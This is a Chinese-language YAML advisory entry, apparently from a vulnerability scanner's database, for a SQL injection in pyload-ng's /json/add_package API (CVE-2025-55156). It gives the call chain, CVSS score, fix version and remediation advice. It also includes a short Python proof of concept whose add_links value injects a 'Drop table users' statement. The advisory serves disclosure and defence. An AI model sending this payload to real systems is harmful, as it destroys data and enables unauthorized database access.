info:
  name: pyload-ng
  cve: CVE-2025-55156
  summary: pyload-ng 中通过 API /json/add_package 存在SQL注入漏洞
  details: |
    `/json/add_package` API端点中的`add_links`参数易受SQL注入攻击。
    这是由于在`src/pyload/core/database/file_database.py`文件的`update_link_info`函数中对用户输入进行了不安全处理，
    导致未经净化的数据被直接拼接到SQL查询语句中。
    攻击者可利用此漏洞执行任意SQL命令，可能导致未授权的数据访问、修改或删除。
    **漏洞调用链**：
    ```
    josn_blueprint.py#add_package
    → src/pyload/core/api/__init__.py#add_package
    → src/pyload/core/managers/file_manager.py#add_links
    → src/pyload/core/threads/info_thread.py#run
    → src/pyload/core/threads/info_thread.py#update_info
    → src/pyload/core/managers/file_manager.py#update_file_info
    → src/pyload/core/database/file_database.py#update_link_info
    ```
    **概念验证（PoC）**：
    ```python
    import requests
    if __name__ == "__main__":
        url = "http://localhost:8000/json/add_package"
        data = {
            "add_name": "My Downloads1",
            "add_dest": "0",
            "add_links": "https://www.dailymotion.com/video/x8zzzzz') or 1; Drop table users;--",
            "add_password": "mypassword"
        }
        response = requests.post(url, cookies=your_cookies, data=data)
        print(response.status_code, response.text)
    ```
  cvss: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N/E:P
  severity: HIGH
  security_advise: |
    1. 升级至版本 `pyload-ng>=0.5.0b3.dev91`。
    2. 对所有用户输入进行清理和验证，特别是用于SQL查询的部分。
    3. 使用参数化查询或ORM方法以防止SQL语句中的字符串直接拼接。
    4. 审查并审计数据库交互代码中是否存在类似的不安全查询构造模式。
rule: version >= "0" && version < "0.5.0b3.dev91"
references:
  - https://github.com/pyload/pyload/security/advisories/GHSA-pwh4-6r3m-j2rf
  - https://nvd.nist.gov/vuln/detail/CVE-2025-55156
  - https://github.com/pyload/pyload/commit/134edcdf6e2a10c393743c254da3d9d90b74258f
  - https://github.com/pyload/pyload
  - https://github.com/pyload/pyload/blob/develop/src/pyload/core/database/file_database.py#L271